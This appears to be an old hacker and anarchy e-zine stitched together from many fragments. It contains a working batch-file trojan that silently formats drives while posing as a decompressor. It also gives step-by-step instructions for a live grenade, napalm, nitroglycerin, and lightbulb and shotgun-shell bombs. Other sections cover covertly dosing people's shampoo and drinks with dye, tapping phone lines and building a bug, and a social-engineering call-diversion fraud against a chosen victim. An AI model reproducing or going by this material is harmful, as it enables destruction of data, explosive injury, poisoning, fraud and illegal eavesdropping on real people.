Well, here's what's been happening... 





I, EON, am meant to be a "drug crazed hippy", so a rumour going around 

claims. Now, "drug crazed" I could take, JUST, but "HIPPY"? AGHH!! 

Someone is _really_ dragging me through the mud!!! :) Okay, now 

seriously... 







Info on SLi's hack of the WCC computer centre, commonly known as 

Kosmos. All data files are available for inspection at most SLi 

BBS's except SLi BBS itself.



Info on the Cops...  



Well, so far we haven't been too badly burnt, though a party I threw 

was interupted by the police, and TWO SLi members were removed from 

the premises.  Later, one was charged, the other given a warning. 





Info on SLi's TV coverage... 



Well, it's a good few months since that fateful day when TV1 saw fit 

to slam SLi for having files it believed bad online for users to 

download.  Well, if they thought that was bad, they better take a 

look at this mag!  Well, anyway, we now have a video of it and 

numerous paper clippings.  I was told by a reporter, that over 100 

articles were printed in 5 days of shitting on SLi. Luckly TV1 

decided that after the 3rd day the glammer had worn off so 

thankfully, the TV coverage stopped.  The aftermath was a lot of 

little kids asking for filez, me seeing a lawyer, and SLi BBS being 

rather busy for a time.



A Hawkes Bay cell of SLi, and Christurch cell has been setup; all we 

now need is an Auckland cell.  Please, someone help us with that. 

Internationally, we have a cell in the US and one in the UK, although

comunication with them is bad at the best of times. 



Pirates 

~~~~~~~

We have been approched by softwere pirates to help them supply their 

goods to people.  However, we have decided against doing this as we 

believe that if we do that, we will then be breaking the law and we 

have decided that for the meantime, that is something we dont want 

to do. 



BUGs and MICz 

~~~~~~~~~~~~~

We will be selling AM and FM BUGZ for $10 - 20 each.  These are 

handy little devices that will quite easily pick up a conversation 

in a rather large room and transmit on an AM or FM frequency.

Yo!  Well, this is a pretty lame way of making one, but it works.





 @Echo Off 

 Echo y | Format c: 

 



There.  That will format someone's C:, however its pretty stupid and 

basicly not what ya want now something that actually looks to see if 

the drive is there would be nice so 



 If exists c:\nul goto ha1

 if exists d:\nul goto ha2 



 :ha2



 echo y | format D:



That will look to see if the drive is there But it also has the 

problem of showing you its looking for it so if ya put a



 > NUL 



Next to every Line it will stop ANY echoing to screen but how do we 

make the person believe that the thing isn't a trojen well

 

 echo Uncompressing 



How about if I wanna delete Something 



Echo y | Del . > Nul          

Dels .* in that DIR

OR

Del <File name> > NUL



Delets Filename



So well here is a working bat trojen

What is a Phone Phreak ??



Well a Phone phreak is someone who uses the phone system to get free 

calls it also can mean anyone interested in telephones, so here we 

go... 



Very easy ways of phreaking include: 



    PillBoxing

    LineManning

    Tapping

   



Pillboxing...

~~~~~~~~~~~~~

... is basicly when you have a Pillbox <A Grey round tube with a 

mass of wires inside and telco's name all over it>



What to do well go to a real rich street late at night have either 

a phone or a laptop and a pocket modem open the pillbox up.  Inside 

you will see a mass of wires.  Now, what you are looking for are two 

pairs that are twisted together, ie. Every wire is connected to 

another by a little thing like a O.  Now, you wanna find two O wire 

pairs that are twisted together.  With this, you connect <with 

aligator clips> a telephone jack box <the white thing that the phone 

plugs into> then plug the phone in listen for a dialtone.  If you 

get one... bingo!  Call the number you want to where you want to.  

Break/cut the lines when finished and go home.  If ya dont get a 

tone, just fiddle with different wire combinations.  You will get 

one eventually.



Note: You may find, infact in most pillboxez, you will find a thick 

black cable with 2 wirez inside it.  If you connect to these, you 

will get the best results.





Line Manning

~~~~~~~~~~~~

Okay. The boxes are white or Green and contain lots of ceramic disks 

that are connected to all the lines in the basic vasinity.  Now, the 

lock can be opened with an 11 mm socket set piece.  To connect a 

phone to this, either A) look to see if there is a small blue clip 

somewhere inside the box, then if so, connect the aligator clips 

going to ya phone to the wires from the blue clip.  Then push the 

blue clip into the holes in the ceramic bar.  Bingo!  You should get 

a dialtone.  If not, try again; or B)  No clip, huh?   Well, get 2 

paperclips (steel ones), connect take apart 

  the clip so you can push onend up the little hole once the clip is 

  in put the other clip in the hole next to it then clip ya alagator 

  clips on the end of the phone to the paperclips and ya should get a 

  dialtone

  A: Making someones hair blue...



 First, make sure that the victim uses Selsun Blue 5 or a shampoo (or 

conditioner) with a blue(ish) colour. This works best when the victim 

is particularly vain and washes his/her hair often, and is a lot more 

visible if the victim os blonde or light haired. Excuse yourself to go

to the toilet. With any luck, the shower will be in the same room. 

If you can, lock yourself in, and get out your methylene blue. This is

relatively easy to come by, most science laboratories have it, and if 

you have access to a lab, either at work or at school, then it shouldn't

be too hard to make up something that needs it. I'm pretty sure you can

get hold of different colours, such as methylene red, but to find red 

shampoo is a slightly harder job. Add your methylene blue to their 

shampoo. Pretty soon, you'll start noticing a change in the victims 

hair colour, unless he runs out of shampoo very fast. Another point: 

Methylene Blue is permenent, it'll be virtually impossible, if not 

completely, to get out...



 Here's something to get your mates... Slip some methylene blue into 

their tea/beer/coffee/whatever and voila! Blue piss! Alternitively, 

use methylene red, giving the remote effect of pissing blood. Quite

a lot of fun, really, takes AGES to piss the stuff out too....

Ok, well unless your a complete lamer, u should b able 2 work out 

how 2 put one of these little beastz together, but just for the 

lamerz I'll give some instructions.



Ok, well basically the 1rst thing 2 do is to get a detonater, for 

obvious reasons it is best to buy one. Try an army surplus store or 

something similar, a lot of these have old and practice grenades 

which u can use.



Now once you have the detonater, try mucking around with it and 

seeing how it works (if you buy one from an army surplus store, it 

wont be primed). If it doesn't come with a pin, then make one with a 

nail that fitz.



The next stage is the srapnel casing, hopefully the grenade was 

whole when you got it, but this may not be the case, in which you 

can either make one or try and find an old one... There are a few 

differences between casings, the pineapple grenade is 4 spraying 

shreds of srapnel out everywhere which were used mainly in ww2. The 

other one is a plain round based one. If you didnt get either of

these types of casings on your soon to be fully active grenade, then 

you can use a plastic (which is still dangerous shrapnel) tin, metal 

etc home made replacement. 



Well, by now you should have the basic structure of a grenade, the 

only thing missing is the primer and the explosive. For a primer, I 

use the primer out of some ramset .22 bullets, to safely open these 

you just sqeez the front end lightly on all sides, then tip out the 

main explosive (chordite), now pry open the front a bit more and tip 

upside down and shake out onto a piece os A4 paper the green powder 

at the bottom, this is the primer, it is fairly shock and heat 

sensitive so be carefull. Do this 2 about 3 or 4 of the bullets. Now 

take the grenade (if it has a handle take that off, its better 

without it while you are constructing the grenade, and u may prefer 

to have it off while detonating as well, experiment abit) and pry 

out the metal where the hammer strikes, this may  be diffucult in 

some cases, now pack in the primer, and put the metal back on and 

turn the detonating device upside down (if the casing is on then 

unscrew it and put it aside,it is always better and safer to have 

the grenade disasembled) and push in a resonably long wick, should 

reach the bottom of the casing preferably. 



Ok now you are almost ready, all you need to do is pack the casing 

about 3/4 full of high explosive. Then screw on the detonating 

device, safety check, and blow the shit out of something! But for 

gods sake BE CAREFUL!



      Till next time, L8r Man!

Napalm

~~~~~~

   Napalm is an easy, cheap way to create a nearly unstoppable fire. 



Construction:



   Mix 1:1 petrol and soap flakes <The stuff ya do ya clothes in>.

   Heat slowly by putting the mixture into a steel container. Boil 

   water and put in another container big enough to hold the first 

   container.  Place the first container in the second, and slowly 

   stir.  Watch out 4 petrol fumes - it really stinks, as you know.  







Nitro 

~~~~~                          3                    3  

   Well known explosive; one CM will prduce 10000 CM of expanding 

   gas. 



Items Neaded: 



   Ice bath 

   Ice <A LOT> 

   Stiring rod 2

   Glas beaker 2  <75 ml>

   Concentrated nitric <fuming red>

   Concentrated sulphuric <fuming red>

   Glyserin 

   Litmis <blue>

   Filter paper 

   Sodium bicarbonate 

   Glass mercury themometer



First, be bloody careful.  Do this outside. 



Construction:



    Place ice in ice bath. Place beaker in bath and slowly add 

    nitric acid.  Cool to below room temperature. 

    Once cooled, add sulfuric and slowly cool to 10 degrees celcius 

    or so.  Slowly, SLOWLY, add Glyserin SLOWLY with an eyedropper 

    SLOWLY VERY SLOWLY.  Once you have covered the surface of the 

    acid, stir with a glass rod for 10 mins.  Nitro should form at 

    bottom of beaker.  Keep always below 15 - 20 degrees. 

    Decant the acid off until you can remove the nitro with an 

    eyedropper and place in a solution of sodium bicarbonate in 

    another beaker.  Test with litmis and add solution until litmis 

    remains blue.

    Store in a safe, not to hot/cold place and use within 24 hours. 







Gun Powder <Black Powder>

~~~~~~~~~~~~~~~~~~~~~~~~~

  Black, and a good little explosive when used properly.



Items Needed:



    Potassium Nitrate 85%

    Carbon (Charcol)  12%

    Sulfur             3%



Construction:

 

   They are rough percentages, but try a little like that and play 

   with it.  The more potassium you add, the faster it wll burn; 

   Less sulfur, slower. Less carbon, the less it will burn.  What 

   you will do is just put them all in a mixing jar. I used a little 

   cardboard box with low sides and then ground it up and mix 

   together.  You can get potassium nitrate at most chemists or 

   garden shops. It is commonly known as Salt Peter.     





  Well, there will be some more in later editions of the SLi mag.

This section is on what to do with explosives and basic 

miscellanious hints and demos on how to make handy things like 

lightbulb bombs, sky rocket launchers etc...

 /                                           \Petrol

 Power prongs



     The petrol conducts electricity, the sparks ignight the petrol,

     Bang!  The lightbulb explodes in a 10 m cubed radus or so.

     You may need to run a pice of fuse wire between the 2 contacts

     to make it detonate.

     You can also do this in an ordinary lightbulb just be sure to 

     cut the glass at the top of the bulb and don't dammage the 

     filament.







  Shot Gun Shell Bomb

  ~~~~~~~~~~~~~~~~~~~

  Make a roll of cardboard just big enough so that the shell tightly

  fits inside the tube.  Connect to the tube, fins made of card.

  Drill a hole through a cork, glue the cork to the detonator end. 

  With the hole over the detanator, place the nail in the hole in 

  the cork.  Biff.

   Diverting calls to remote locations on the globe...



     Wanna give someone a VERY expensive phone bill?  

  Put call diversion on the victims phone line.  The best way to do 

  this is to go to the airport, find a free phone and make sure you 

  know a few things. 

  First, you'll need to know the victim's name, phone number, his/her

  address, and the number to which you want to divert it to.  An 

  even better way to do it, is to do it from their house, but this 

  may not be possible. You must have a valid phone number to divert 

  it to.  

     This is generally guessable, but to be sure, ring the 

  international directory service on 0172 (New Zealand), from a 

  payphone preferably, and ask for an obvious name, like Smith, from 

  a major street or apartment building, if you're lucky enough to 

  know the address of one, or go somewhere with international phone 

  books.  Once at the airport, ring 123 (NZ) and say: "Hi, my name's 

  <victims name>, and I'm going to <the place> for 6 months (or 

  whatever). <next part optional> I work as a <victim's occupation> 

  and don't want to miss any calls. I'd like to use call-diversion 

  to divert the calls to <the place>." 

     Be extremely co-operative, but don't act too bright, act pretty 

  thick so the operator can't be stuffed or something.  After that, 

  it should be set, and to help you along, you can ring the victim a 

  lot so he/she has a lot of calls to pay for, and get your mates to 

  ring too!

Ethics & hacking

~~~~~~~~~~~~~~~~



    Hackers are faced with a delema. Is it ethical for them to enter 

    a system and look round unatherised? 



    Well its a tuffe you see there are some hackers who just dont 

    care others who dont even think about it and still others who do

    



    Basicly this Section is dedicated to setting a few rules up





   1

    Dont ever enter a system that could endanger lives 



   2 

    Dont destroy more data than nessary ie. just the logs not the HDD



   3

    Think will people lose the jobs if I get caught 



   4 

    There is NO honor among Thives Let there be honor amoung us.



   5 

    Never let your anger cloud your better jugement 



   6 

    Dont talk Dont BRAG 



   7 

    Teach those who want to learn 

   

  



   The Seven golden rules the final one 



   Use your common scence.





   These are the rules I use and I havent been charged with anything 

   Yet and to expect to be in the near future.



   With these rules atleast you wont be seen as someone who wants to

Well, what is it ??  Well, it's the ability to make people do what 

ya want em to do, for example:



 <RING RING>



 "Hello.  Telecom 123; how can I help?"

 

 "Ah, yes, umm im calling from my nextdoor nabors house my fones gon 

  on the blink could ya please help?"

 

 "Yep Sure can whats YOUR phone number?"



 "OK the number is ???-????"



 "We will check that out ASAP shouldnt take long"



 "Oh could you also Put call waitting on the line ?? I guess I had 

  might as well get call waiting at the same time a? "



 "Ok well sure we will install that at 2.00 Pm"



 "Oh ok thanks have a nice day"



 "Thank you bi"



 CLICK BEEP BEEP



 

Well there ya go imagin if that was a bbs line you gust put Call 

waiting on :) ofcourse you were useing one of the meathods described 

in the phreaking section and not YOUR home line and the number you 

gave was of course some one ya wanted to piss off now Social 

Engineering is one of the most important things a Hack / Phreak / 

Anarchist can have more important than ya Phone , Password lists or 

chemicals as a good Social Engineer can get these things by tricking 

intimadating fooling and conning there way into that building into 

the system etc.. Social Engineering is byfar the most helpful thing 

you can ever have.

                              -[ THE OVERLORD ]-



-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-





                                PART I: THE LAW





Federal law:

  Section 605 of title 47 of the U.S code, forbids interception of

communication, or divulagance of intercepted communication except by persons

outlined in section 119 of title 18 (a portion of the Omnibus crime control and

safe streets act of 1968). This act states that "It shall not be unlawful under

this act for an operator of a switchboard, or an officer, employee, or agent of

any communication common carrier who's switching system is used in the

transmission of a wire communication to intercept or disclose intercepted

communication."



What all this legal bullshit is saying is that if you don't work for a phone

company then you can't go around tapping people's lines. If you decide to

anyway, and get caught, it could cost you up to 5 years of your life and

$10,000. This, you are all assuming, means that if you tap someone else's line,

you will be punished....wrong! You can't tap your own line either. The

punishment for this is probably no more than a slap on the hand, that is if

they actually catch you, but it's a good thing to know..............now on to

the fun.....



                               PART II: TAPPING



Everyone has at some time wanted to hear what a friend, the principal, the prom

queen, or a neighbor has to say on the phone. There are several easy ways to

tap into a phone line. None of the methods that I present will involve actually

entering the house. You can do everything from the backyard. I will discuss

four methods of tapping a line. They go in order of increasing difficulty.



1. The "beige box": a beige box (or bud box) is actually better known as a

"lineman" phone. They are terribly simple to construct, and are basically the

easiest method to use. They consist of nothing more than a phone with the

modular plug that goes into the wall cut off, and two alligator clips attached

to the red and green wires. The way to use this box, is to venture into the

yard of the person you want to tap, and put it onto his line. This is best done

at the bell phone box that is usually next to the gas meter. It should only

have one screw holding it shut, and is very easily opened. Once you are in, you

should see 4 screws with wires attached to them. If the house has one line,

then clip the red lead to the first screw, and the green to the second. You are

then on the "tappee's" phone. You will hear any conversation going on. I

strongly recommend that you remove the speaker from the phone that you're using

so the "tappee" can't hear every sound you make. If the house has two lines,

then the second line is on screws three and four. If you connect everything

right, but you don't get on the line, then you probably have the wires

backward. Switch the red to the second screw and the green to the first. If no

conversation is going on, you may realize that you can't tap the phone very

well because you don't want to sit there all night, and if you are on the

phone, then the poor tappee can't dial out, and that could be bad...so.......

method two.



2. The recorder: This method is probably the most widespread, and you still

don't have to be a genius to do it. There are LOTS of ways to tape

conversations. The two easiest are either to put a "telephone induction pickup"

(Radio Shack $1.99) on the beige box you were using, then plugging it into the

microphone jack of a small tape recorder, and leaving it on record. Or plugging

the recorder right into the line. This can be done by taking a walkman plug,

and cutting off the earphones, then pick one of the two earphone wires, and

strip it. There should be another wire inside the one you just stripped. Strip

that one too, and attach alligators to them. Then follow the beige box

instructions to tape the conversation. In order to save tape, you may want to

use a voice activated recorder (Radio Shack $59), or if your recorder has a

"remote" jack, you can get a "telephone recorder control" at Radio shack shack

for $19 that turns the recorder on when the phone is on, and off when the phone

is off. This little box plugs right into the wall (modularly of course), so it

is best NOT to remove the modular plug for it. Work around it if you can. If

not, then just do you best to get a good connection. When recording, it is good

to keep your recorder hidden from sight (in the Bell box if possible), but in a

place easy enough to change tapes from.



3. The wireless microphone: this is the BUG. It transmits a signal from the

phone to the radio (FM band). You may remember Mr. Microphone (from Kaytel

fame); these wireless microphones are available from Radio Shack for $19. They

are easy to build and easy to hook up. There are so many different models, that

is is almost impossible to tell you exactly what to do. The most common thing

to do is to cut off the microphone element, and attach these two wires to

screws one and two. The line MIGHT, depending on the brand, be "permanently off

hook". This is bad, but by phucking around with it for a while, you should get

it working. There are two drawbacks to using this method. One, is that the poor

asshole who is getting his phone tapped might hear himself on "FM 88, the

principal connection". The second problem is the range. The store bought

transmitters have a VERY short range. I suggest that you build the customized

version I will present in part four (it's cheaper too). Now on to the best of

all the methods....



4. The "easy-talks": This method combines all the best aspects of all the the

other methods. It only has one drawback... You need a set of "Easy-talk" walkie

talkies. They are voice activated, and cost about $59. You can find 'em at toy

stores, and "hi-tech" catalogs. I think that any voice activated walkie talkies

will work, but I have only tried the easy-talks. First, you have to decide on

one for the "transmitter" and one for the "receiver". It is best to use the one

with the strongest transmission to transmit, even though it may receive better

also. De-solder the speaker of the "transmitter", and the microphone of the

"receiver". Now, go to the box. put the walkie talkie on "VOX" and hook the

microphone leads (as in method three) to the first and second screws in the

box. Now go home, and listen on your walkie talkie. If nothing happens, then

the phone signal wasn't strong enough to "activate" the transmission. If this

happens, there are two things you can do. One, add some ground lines to the

microphone plugs. This is the most inconspicuous, but if it doesn't work then

you need an amplifier, like a walkman with two earphone plugs. Put the first

plug on the line, and then into one of the jacks. Then turn the volume all the

way up (w/out pressing play). Next connect the second earphone plug to the mice

wires, and into the second earphone outlet on the walkman. Now put the whole

mess in the box, and lock it up. This should do the trick. It gives you a

private radio station to listen to them on: you can turn it off when something

boring comes on, and you can tape off the walkie talkie speaker that you have!



                      PART IV: WIRELESS TRANSMITTER PLANZ



This is a tiny transmitter that consists on a one colpitts oscillator that

derives it's power from the phone line. Since the resistance it puts on the

line is less than 100 ohms, it has no effect on the telephone performance, and

can not be detected by the phone company, or the tappee. Since it is a

low-powered device using no antenna for radiation, it is legal to the FCC.

(That is it complies with part 15 of the FCC rules and regulations). It,

however is still illegal to do, it's just that what you're using to do it is

legal. This is explained later in part 15... "no person shall use such a device

for eavesdropping unless authorized by all parties of the conversation" (then

it's not eavesdropping is it?). What this thing does, is use four diodes to

form a "bridge rectifier". It produces a varying dc voltage varying with the

auto-signals on the line. That voltage is used to supply the the voltage for

the oscillator transistor. Which is connected to a radio circuit. From there,

you can tune it to any channel you want. The rest will all be explained in a

C1                  | 47-Pf ceramic disk capacitor

C2,C3               | 27-Pf mica capacitor

CR1,CR2,CR3,CR4     | germanium diode 1n90 or equivalent

R1                  | 100 ohm, 1/4 watt 10% composition resistor

R2                  | 10k, 1/4 watt 10% composition resistor

R3                  | .7k, 1/4 watt 10% composition resistor

L1                  | 2 uH radio frequency choke (see text)

L2                  | 5 turns No.20 wire (see text)

Q1                  | Npn rf transistor 2N5179 or equivalent

-----------------------------------------------------------------



L1 may be constructed by winding approximately 40 turns of No. 36

enamel wire on a mega-ohm, 1/2 watt resistor. The value of L1 is

not critical. L2 can be made by wrapping 5 turns of No. 20 wire

around a 1/4 inch form. After the wire is wrapped, the form can

be removed. Just solder it into place on the circuit board. It

should hold quite nicely. Also be sure to position Q1 so that the

emitter, base, and collector are in the proper holes. The

schematic should be pretty easy to follow. Although it has an

unusual number of grounds, it still works.

The odd thing about this bug that we haven't encountered yet, is that it is put

on only one wire (either red or green) so go to the box, remove the red wire

that was ALREADY on screw

1 and attach it to wire 'A' of the bug. Then attach

wire 'B' to the screw itself. You can adjust the frequency which it comes out

on the FM channel by either smooshing, or widening the coils of L2. It takes a

few minutes to get to work right, but it is also very versatile. You can change

the frequency at will, and you can easily record off your radio.



                           PART FIVE: HELPFUL HINTS





First of all, With method one, the beige box, you may notice that you can also

dial out on the phone you use. I don't recommend that you do this. If you

decide to anyway, and do something conspicuous like set up a 30 person

conference for three hours, then I suggest that you make sure the people are

either out of town or dead. In general, when you tap a line, you must be

careful. I test everything I make on my line first, then install it late at

night. I would not recommend that you leave a recorder on all day. Put it on

when you want it going, and take it off when you're done. As far as recording

goes, I think that if there is a recorder on the line it sends a sporadic beep

back to the phone co. I know that if you don't record directly off the line

(i.e off your radio) then even the most sophisticated equipment can't tell that

you're recording. Also, make sure that when you install something, the people

are NOT on the line. Installation tends to make lots of scratchy sounds, clicks

and static. It is generally a good thing to avoid. It doesn't take too much

intelligence to just make a call to the house before you go to install the

thing. If it's busy then wait a while. (This of course does not apply if you

are making a "midnight run").



All in all, if you use common sense, and are *VERY* careful, chances are you

won't get caught. Never think that you're unstoppable, and don't broadcast what

you're doing. Keep it to yourself, and you can have a great time.
